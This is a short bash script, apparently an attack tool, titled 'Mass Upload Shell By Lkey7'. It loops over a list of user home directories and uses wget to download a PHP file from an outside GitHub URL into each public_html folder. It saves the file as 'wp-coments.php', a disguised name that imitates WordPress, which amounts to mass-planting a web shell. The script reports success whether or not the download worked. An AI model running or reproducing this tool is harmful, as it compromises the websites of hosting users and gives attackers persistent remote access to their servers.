mrh="\033[31m"
kun="\033[33m"
kunt="\033[33;1m"
ijo="\033[32m"
wet="\033[97;1m"
nat="\033[0m"
bir="\033[90;36m"
echo "====================================="
echo ''
echo '              RESWARA'
echo "     Mass Upload Shell By Lkey7"
echo ''
echo "====================================="
read -p "Input File: " lis;
read -p "Path: " pat;
while read line; do
c=$(cd /home/${line}/public_html/ && wget -q https://raw.githubusercontent.com/sandanisa/ty/main/ty.php -O wp-coments.php)
if [[ $c ]];
then
echo -e "${nat}[${ijo}Succes${nat}] ${line}/wp-coments.php"
else
echo -e "${nat}[${ijo}Succes${nat}] ${line}/wp-coments.php"
fi
done < $lis
